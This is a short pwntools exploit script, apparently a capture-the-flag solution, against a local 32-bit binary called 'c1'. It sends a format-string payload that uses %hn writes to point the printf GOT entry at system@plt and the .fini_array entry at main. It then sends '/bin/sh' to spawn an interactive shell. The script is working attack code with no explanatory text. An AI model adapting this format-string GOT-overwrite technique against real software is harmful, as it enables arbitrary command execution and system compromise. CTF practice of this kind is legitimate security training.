from pwn import *
context(log_level='debug',arch='x86',terminal=['tmux','splitw','-h'])

io = process("c1")
elf = ELF("c1")
system = elf.plt['system'] #0x80483D0 
main = elf.sym['main'] #0x8048534 
printf = elf.got['printf']
fini = 0x0804979C

gdb.attach(io)
pause()

payload = p32(fini+ 2) + p32(printf+2) + p32(printf) + p32(fini)
payload += b"%" + str(0x0804 - 0x10).encode() + b"c%4$hn"    #0804 
payload += b"%5$hn"
payload += b"%" + str(0x83D0 - 0x0804).encode() + b"c%6$hn"  #83D0
payload += b"%" + str(0x8534 - 0x83D0).encode() + b"c%7$hn"  #8534

io.recvuntil(b"name?\n")
io.sendline(payload)
io.recvuntil(b"name?\n")
io.sendline(b"/bin/sh")

io.interactive()